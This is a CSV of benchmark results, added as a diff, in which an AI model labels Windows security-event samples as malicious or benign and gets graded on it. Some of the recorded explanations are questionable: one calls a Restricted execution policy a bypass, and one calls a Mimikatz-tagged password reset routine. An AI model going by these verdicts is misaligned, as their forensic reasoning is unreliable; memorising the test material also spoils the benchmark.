@@ -1,0 +1,1449 @@
+# DETECTION BENCHMARK RESULTS - column glossary
+# ----------------------------------------------------------------------
+# Model               LLM model id used to score this run
+# Filename            Source artifact analyzed (EVTX file or CSV stem)
+# Difficulty          Tag from metadata.json: easy / medium / hard
+# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
+# Status              processed | error | context_exceeded
+# Malicious           Model verdict: YES (attack) or NO (routine/benign)
+# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
+# Alignment %         Share of cited evidence found verbatim in source (0-100)
+# Structure Valid     Response parsed cleanly into the required sections
+# Event IDs           Event IDs extracted from the model's EVIDENCE block
+# Processes           Process names extracted from the model's EVIDENCE block
+# Accounts            Account names extracted from the model's EVIDENCE block
+# Commands            Command lines / script blocks extracted from EVIDENCE
+# Network             IPs / hostnames / shares extracted from EVIDENCE
+# Registry            Registry keys / values extracted from EVIDENCE
+# Hallucination %     Share of cited evidence not found in source events (0-100)
+# Response Time (s)   Wall-clock seconds from prompt sent to response received
+# Extraction (6)      Did the model find the right evidence? (0-6)
+# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
+# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
+# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
+# Total (20)          Sum of the four criteria above (0-20)
+# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
+# LLM Response        Full raw text the model returned, before any parsing
+#
+# Skip these lines in pandas:  pd.read_csv(path, comment='#')
+# ----------------------------------------------------------------------
+Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
+claude-opus-4-8,ID4103-4104-OpenSSH server activation and config.evtx,hard,A,processed,NO,100.0,100.0,YES,"4103, 4104",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"Start-Service sshd, Set-Service -Name sshd -StartupType 'Automatic', Get-NetFirewallRule -Name *ssh*",win10-02.offsec.lan,,0.0,16.88,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4103, 4104
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Start-Service sshd, Set-Service -Name sshd -StartupType 'Automatic', Get-NetFirewallRule -Name *ssh*
+- Network: win10-02.offsec.lan
+- Registry: None
+
+EXPLANATION:
+An administrator account (OFFSEC\admmig) is starting the OpenSSH server service, setting it to automatic startup, and checking the associated firewall rule (*ssh*), with the remaining events being routine PowerShell module-definition script block logging for the NetSecurity cmdlets. This is consistent with legitimate sysadmin configuration of OpenSSH Server rather than attack behavior, as the actions are standard service-management cmdlets run by an admin with no obfuscation, encoding, or malicious payloads. The bulk of the 4104 events are benign auto-generated CDXML cmdlet definitions loaded when NetSecurity functions are invoked."
+claude-opus-4-8,ID4103-4104-OpenSSH server install.evtx,hard,A,processed,YES,100.0,87.5,YES,"4103, 4104, 40961, 53504, 40962","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","OFFSEC\admmig, OFFSEC\SYSTEM","Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0, powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1' | , Write-Host 'Final result: 1'",,,0.0,12.22,5.2,2.0,4.0,4,15.2,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4103, 4104, 40961, 53504, 40962
+- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig, OFFSEC\SYSTEM
+- Commands: Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0, powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';, Write-Host 'Final result: 1';
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The admmig account uses PowerShell to install OpenSSH.Server via Add-WindowsCapability, which establishes a remote-access service that can serve as a persistence and remote-entry backdoor on the host. This is followed by a SYSTEM-context PowerShell process launched with -ExecutionPolicy Restricted bypass, indicating privilege escalation and execution under the highest privilege account. The combination of enabling a remote SSH server plus SYSTEM-level scripted command execution reflects attacker activity rather than routine administration."
+claude-opus-4-8,ID33205-SQL Server failed login with disabled SA account.evtx,easy,A,processed,YES,100.0,100.0,YES,33205,,sa,,10.23.23.9,,0.0,3.95,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: sa
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+Multiple failed login attempts (action_id LGIF, succeeded:false) for the privileged 'sa' account originate from the same client IP 10.23.23.9 in rapid succession, indicating a brute-force or password-guessing attack against the SQL Server instance MSSQL01\RADAR. Repeated authentication failures with state 7 targeting the SQL administrator account is a classic credential-attack signature rather than benign user error."
+claude-opus-4-8,ID4625-failed login with denied access due to account restriction.evtx,easy,A,processed,YES,100.0,100.0,YES,4625,C:\Windows\System32\winlogon.exe,"FS03$, -",,10.23.23.9,,0.0,3.76,6.0,1.0,4.0,2,13.0,C,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4625
+- Processes: C:\Windows\System32\winlogon.exe
+- Accounts: FS03$, -
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+Two failed RDP logons (LogonType 10) occurred within roughly two minutes from the same source IP 10.23.23.9 against FS03, with Status 0xC000006E indicating invalid credentials/account restrictions. The repeated remote interactive logon failures from a single host suggest an RDP brute-force or credential-guessing attempt rather than routine activity."
+claude-opus-4-8,ID33205-SQL Server member added to database role.evtx,easy,A,processed,NO,100.0,100.0,YES,33205,,"OFFSEC\admmig, test-sql, dbo, db_accessadmin",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,3.95,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: None
+- Accounts: OFFSEC\admmig, test-sql, dbo, db_accessadmin
+- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
+- Network: mssql01.offsec.lan
+- Registry: None
+
+EXPLANATION:
+This is a single SQL Server audit event (action_id APRL) showing the administrative principal OFFSEC\admmig successfully adding the login test-sql to the db_accessadmin role in the RCS-TEST-db database. This is a routine database role-membership change performed by an admin account with no accompanying privilege-escalation chain or suspicious sequence, making it consistent with normal database administration."
+claude-opus-4-8,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,MSSQL$RADAR,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,,,0.0,5.04,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 33205
+- Processes: MSSQL$RADAR
+- Accounts: OFFSEC\admmig, dbo, test-sql
+- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a SQL Server audit event (action_id:CR, succeeded:true) recording the creation of a database user ""test-sql"" mapped to an existing login, performed by an administrative principal OFFSEC\admmig on the RCS-TEST-db database. Creating a database user for an existing login is a routine administrative operation with no signs of privilege escalation, lateral movement, or malicious tooling. The naming and test database context further indicate normal provisioning activity."
+claude-opus-4-8,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,,,0.0,8.83,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4723
+- Processes: None
+- Accounts: hacker2, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event ID 4723 indicates an attempt by a user (admmig) to change the password of an account (hacker2), which is a routine self-service or administrative password operation. There is no privilege escalation, anomalous process, or network indicator present to suggest malicious activity. While the account name ""hacker2"" is suggestive, the event itself reflects standard credential management behavior."
+claude-opus-4-8,ID4728-Member adding to a group by the same account.evtx,easy,A,processed,NO,100.0,100.0,YES,4728,,"lambda-user, Group02",,,,0.0,3.43,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4728
+- Processes: None
+- Accounts: lambda-user, Group02
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a single Event ID 4728 showing a member (lambda-user) being added to a security group (Group02). On its own, a group membership change is a routine administrative action with no accompanying privilege escalation chain, suspicious process, or command activity to indicate an attack."
+claude-opus-4-8,ID4738-Account is sensitive and cannot be delegated.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,4.67,6.0,1.0,4.0,2,13.0,C,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4738, 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Two rapid 4738 user-account-change events on the same target (hack1) by admmig flipped the UserAccountControl flag to 0x4210 and then immediately back to 0x210 within ~4 seconds, indicating the ""DONT_REQUIRE_PREAUTH"" bit was toggled on then off. This paired state change is characteristic of an AS-REP roasting setup where pre-authentication is briefly disabled to capture a hash before reverting to hide the change."
+claude-opus-4-8,ID4738-Password cannot be changed.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,4.40,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Two rapid, back-to-back EID 4738 (user account changed) events on the domain controller rootdc1.offsec.lan target a suspiciously named account ""hack1"" modified by ""admmig"" within ~1.7 seconds. The redacted UAC/SidHistory fields combined with the timing and the attacker-style account name suggest scripted account manipulation (e.g., SID history injection or attribute tampering) rather than routine administrative provisioning."
+claude-opus-4-8,ID4738-Password never expires.evtx,easy,A,processed,YES,100.0,100.0,YES,4738,,"hack1, admmig",,,,0.0,35.33,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4738, 4738
+- Processes: None
+- Accounts: hack1, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Two paired 4738 account-change events on the same target (hack1) by the same actor (admmig) within ~2 seconds show the UAC flag being set (0x10 → 0x210, enabling DONT_REQUIRE_PREAUTH / %%2089) and then reverted (0x210 → 0x10). This toggling of ""Do not require Kerberos preauthentication"" is a classic AS-REP roasting setup, where the attacker briefly enables the flag to harvest a crackable hash, then reverts to avoid detection."
+claude-opus-4-8,ID4720-Local user created.evtx,easy,A,processed,YES,100.0,83.3,YES,"4720, 4732",,"hacking-local-acct, admmig",,,,0.0,8.69,5.0,2.0,4.0,4,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4720, 4732
+- Processes: None
+- Accounts: hacking-local-acct, admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+A new local account named ""hacking-local-acct"" was created (4720) on jump01.offsec.lan and immediately added to the Builtin Users group (4732) by the same actor ""admmig"" within the same fraction of a second. The suspicious account naming combined with the rapid create-then-group-add sequence on a jump host indicates intentional persistence/backdoor account creation rather than routine administration."
+claude-opus-4-8,ID60-High volume file downloaded with BITS.evtx,easy,A,processed,NO,100.0,83.3,YES,"3, 5, 59, 60",,OFFSEC\admmig,,https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso,,0.0,3.81,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 3, 5, 59, 60
+- Processes: None
+- Accounts: OFFSEC\admmig
+- Commands: None
+- Network: https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso
+- Registry: None
+
+EXPLANATION:
+These events show BITS transfer jobs by OFFSEC\admmig downloading the official Ubuntu 20.04.3 desktop ISO from the legitimate releases.ubuntu.com domain. The activity is a routine, large file download from a trusted source with no suspicious payloads, commands, or registry modifications, consistent with benign administrative behavior."
+claude-opus-4-8,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"SQLCMD.EXE, cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",,,0.0,3.15,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: SQLCMD.EXE, cmd.exe
+- Accounts: admmig
+- Commands: sqlcmd  -S .\RADAR,2020
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the account admmig launching SQLCMD.EXE from cmd.exe to connect to a local SQL Server instance (.\RADAR,2020), which is routine database administration activity. There is no evidence of privilege escalation, suspicious network connections, or malicious command execution in this single event."
+claude-opus-4-8,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,3.08,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 14, 12
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+These are routine Microsoft-Windows-Wininit system events (Event IDs 14 and 12) related to ChkDsk/boot configuration status on WIN10-client01.offsec.lan. There are no processes, accounts, commands, or network indicators suggesting malicious activity, and the events reflect normal system initialization behavior."
+claude-opus-4-8,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,3.28,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4664
+- Processes: None
+- Accounts: Admin
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event ID 4664 records the creation of a hard link, in this case for a Sysmon configuration file (sysmonconf.xml) within the Admin user's Downloads folder. This is routine file system activity consistent with setting up or configuring Sysmon monitoring, with no privilege escalation, suspicious commands, or network indicators present."
+claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,4.25,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4673
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: hack1
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a single Event 4673 (privileged service called) involving SeMachineAccountPrivilege invoked through lsass.exe and the Security Account Manager, which is normal behavior for machine account operations. In isolation there is no privilege escalation chain, no suspicious process, and no sequence of events indicating attack behavior. Although the username ""hack1"" is suggestive, the event itself reflects routine SAM/LSASS activity and cannot be confirmed malicious on its own."
+claude-opus-4-8,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,YES,100.0,100.0,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,,,0.0,5.80,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4662, 5136
+- Processes: None
+- Accounts: admmig, FS02$, ROOTDC1$
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The account admmig modified a groupPolicyContainer object's versionNumber (5136 events incrementing 1 to 2) under CN=POLICIES,CN=SYSTEM,DC=OFFSEC,DC=LAN, indicating a GPO change on the domain controller. This is followed by repeated 4662 directory-object access events tied to user objects (objectClass user GUID bf967a86) by FS02$ and SYSTEM, consistent with a GPO-based privilege escalation/abuse pattern targeting domain accounts. The combination of a policy edit immediately preceding directory object access on a domain controller is a suspicious escalation chain rather than routine activity."
+claude-opus-4-8,ID4964-Login of a member of a special group.evtx,easy,A,processed,YES,100.0,100.0,YES,4964,,"admmig, LOCAL SERVICE, ROOTDC1$",,,,0.0,7.62,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4964
+- Processes: None
+- Accounts: admmig, LOCAL SERVICE, ROOTDC1$
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event 4964 (""Special groups have been assigned to a new logon"") repeatedly fires for the account admmig with the same monitored SID (S-1-5-21-4230534742-2542757381-3142984815-1613) appearing in the SidList across many rapid logons on a domain controller (rootdc1.offsec.lan). The repeated special-privilege group membership assigned to a single admin-style account in a short burst on a DC is consistent with privileged credential abuse/lateral movement rather than routine activity."
+claude-opus-4-8,ID5124-OCSP security settings changed.evtx,easy,A,processed,NO,100.0,100.0,YES,"5121, 5120, 5123, 5124",,admmig,,,,0.0,3.66,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 5121, 5120, 5123, 5124
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+These events (5120/5121/5123/5124) reflect routine Online Responder/OCSP configuration changes on a PKI server, including cache entries, thread counts, audit filters, and security setting updates performed by the administrative account admmig. The changes are consistent with normal certificate services administration and show no privilege escalation, suspicious processes, or network indicators."
+claude-opus-4-8,ID1-SYSMON driver unload (FilterManager).evtx,easy,A,processed,NO,100.0,100.0,YES,1,,,,,,0.0,2.69,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a Microsoft-Windows-FilterManager Event ID 1 indicating a file system filter driver (SysmonDrv) successfully registered with a final status of 0x0 (success). This is routine system activity associated with the loading of the Sysmon monitoring driver and shows no signs of malicious behavior."
+claude-opus-4-8,ID13-Defender service configuration disabled.evtx,easy,A,processed,NO,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,,HKLM\System\CurrentControlSet\Services\WdNisDrv\Start,0.0,4.23,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 13
+- Processes: C:\Windows\system32\services.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: HKLM\System\CurrentControlSet\Services\WdNisDrv\Start
+
+EXPLANATION:
+The registry SetValue operations were performed by the legitimate services.exe process (PID 648) modifying the Start value of the WdNisDrv service (Windows Defender Network Inspection driver) to DWORD 0x00000003 (manual/demand start). This is normal service configuration behavior consistent with standard Windows service management and shows no signs of privilege escalation, persistence, or malicious tampering."
+claude-opus-4-8,ID8-Module Virtualization disabled (Credential Guard).evtx,easy,A,processed,NO,100.0,100.0,YES,"8, 10, 7, 9","DISM Package Manager Provider, Windows Optional Component Manager",,,"N900B7FFD.kapsch.co.at, N900B7FFD.kbceu.kbcnet.tech",,0.0,5.99,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 8, 10, 7, 9
+- Processes: DISM Package Manager Provider, Windows Optional Component Manager
+- Accounts: None
+- Commands: None
+- Network: N900B7FFD.kapsch.co.at, N900B7FFD.kbceu.kbcnet.tech
+- Registry: None
+
+EXPLANATION:
+These are routine Windows Servicing (CBS) events showing optional component and update state changes (initiation, installation, completion) for standard Microsoft packages such as Windows Defender definitions, printing features, Media Player, WSL, and VirtualMachinePlatform. All operations completed with ErrorCode 0x0 via legitimate servicing clients (DISM Package Manager Provider and Windows Optional Component Manager), consistent with normal update/feature management. There is no evidence of privilege escalation, suspicious commands, or attacker activity."
+claude-opus-4-8,ID4739-Domain policy changed by non system account.evtx,easy,A,processed,NO,100.0,100.0,YES,4739,,admmig,,,,0.0,3.68,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4739
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event ID 4739 indicates a domain policy was changed by the account ""admmig"" on rootdc1.offsec.lan, but all policy fields (password age, lockout, machine account quota, etc.) show ""-"" meaning no values were captured. As a single isolated event with no escalation chain, suspicious commands, or altered policy values shown, this appears to be routine domain administration activity rather than a clear attack signal."
+claude-opus-4-8,ID4908-Special group table changed.evtx,easy,A,processed,YES,100.0,100.0,YES,4908,,"S-1-5-21-4230534742-2542757381-3142984815-1613, S-1-5-21-4230534742-2542757381-3142984815-1614, S-1-5-21-4230534742-2542757381-3142984815-1615",,,,0.0,4.64,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4908
+- Processes: None
+- Accounts: S-1-5-21-4230534742-2542757381-3142984815-1613, S-1-5-21-4230534742-2542757381-3142984815-1614, S-1-5-21-4230534742-2542757381-3142984815-1615
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Event 4908 indicates changes to the ""Special Groups"" logon table on the domain controller rootdc1.offsec.lan, and the repeated modifications show new SIDs being progressively added (1613, 1614, then 1615). Manipulating the Special Groups auditing list to insert custom SIDs is an attacker technique used to track or selectively control auditing of privileged accounts, and the sequential additions on a DC indicate deliberate tampering rather than routine activity."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-services-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc""",,,0.0,6.97,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\mmc.exe, C:\Windows\explorer.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\services.msc""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the Microsoft Management Console (mmc.exe) launching the Services snap-in (services.msc), spawned by explorer.exe under an interactive Administrator session. This is standard, signed Microsoft system administration activity with a legitimate parent-child relationship and expected file path. There are no indicators of malicious behavior such as suspicious command lines, abnormal parent processes, or network connections."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-eventvwr-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, explorer.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",,,0.0,3.89,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, explorer.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows mmc.exe launching the Event Viewer snap-in (eventvwr.msc) from explorer.exe, a normal administrative action when an admin opens Event Viewer. The signed Microsoft binary, standard command line, and benign parent process all indicate routine system administration rather than malicious activity."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-secpol-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s",,,0.0,4.20,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\secpol.msc"" /s
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the Microsoft Management Console (mmc.exe) launching the Local Security Policy snap-in (secpol.msc) from ServerManager.exe, a normal administrative workflow. The signed Microsoft binaries, standard system paths, and legitimate administrator context indicate routine system configuration activity rather than an attack."
+claude-opus-4-8,BENIGN-ID1-rundll32-appxdeploymentextensions-onecore-dll-shellrefres.csv,,,processed,NO,100.0,100.0,YES,1,"rundll32.exe, svchost.exe","WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM","rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc",,,0.0,10.10,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: rundll32.exe, svchost.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator, NT AUTHORITY\SYSTEM
+- Commands: rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh, C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows rundll32.exe launched by svchost.exe running the AppXSvc service, executing the legitimate signed Microsoft AppXDeploymentExtensions.OneCore.dll with the ShellRefresh function. The parent-child relationship (AppXSvc spawning rundll32 for app deployment shell refresh) and the Microsoft-signed binaries from System32 are consistent with normal Windows AppX servicing activity. There are no suspicious command-line arguments, network indicators, or unusual paths to suggest malicious behavior."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-comexp-msc.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"", ""C:\Windows\system32\ServerManager.exe""",,,0.0,4.33,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\ServerManager.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\comexp.msc"", ""C:\Windows\system32\ServerManager.exe""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the Microsoft Management Console (mmc.exe) launching the Component Services snap-in (comexp.msc) from Server Manager, all signed Microsoft binaries running from standard system paths. This is normal administrative activity by an Administrator account, with no suspicious command lines, network connections, or registry modifications. The parent-child relationship (ServerManager.exe spawning mmc.exe) is expected behavior during routine server administration."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-gpedit-msc.csv,,,processed,NO,100.0,87.5,YES,1,"C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe",WIN-FPV0DSIC9O6\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc",,,0.0,4.17,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\mmc.exe, C:\Windows\System32\sihost.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpedit.msc
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the Microsoft Management Console (mmc.exe) launching the Group Policy Editor (gpedit.msc), a signed Microsoft binary from its standard System32 location. The activity is consistent with routine administrative configuration by an Administrator account, with no suspicious command line, network, or registry indicators present."
+claude-opus-4-8,BENIGN-ID1-dism-online.csv,,,processed,NO,100.0,100.0,YES,1,C:\Windows\System32\Dism.exe,WIN-FPV0DSIC9O6\Administrator,"C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all",,,0.0,4.84,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\Dism.exe
+- Accounts: WIN-FPV0DSIC9O6\Administrator
+- Commands: C:\Windows\system32\dism.exe /online /logpath:""C:\Windows\debug\DNS-Server-Full-Role_install.dcpromoui_cbs.log"" /norestart /quiet /Enable-Feature /FeatureName:DNS-Server-Full-Role /FeatureName:DNS-Server-Tools /all
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate, signed Microsoft DISM utility being run by an Administrator to enable the DNS Server role and tools, a routine server administration task. The command line, signed Microsoft binary, and standard system path are all consistent with benign Windows feature installation activity."
+claude-opus-4-8,BENIGN-ID1-reg-query.csv,,,processed,NO,100.0,90.0,YES,1,"reg.exe, cmd.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64",,hklm\software\microsoft\windows\softwareinventorylogging,0.0,4.97,5.4,6.0,4.0,3,18.4,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: reg.exe, cmd.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\reg.exe  query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64, C:\Windows\system32\cmd.exe /c C:\Windows\system32\reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
+- Network: None
+- Registry: hklm\software\microsoft\windows\softwareinventorylogging
+
+EXPLANATION:
+This event shows reg.exe performing a read-only query of the SoftwareInventoryLogging collection state registry value, which is routine system inventory/telemetry activity. The signed Microsoft binary, system context, and benign read-only query with no modification indicate normal operating system behavior rather than an attack."
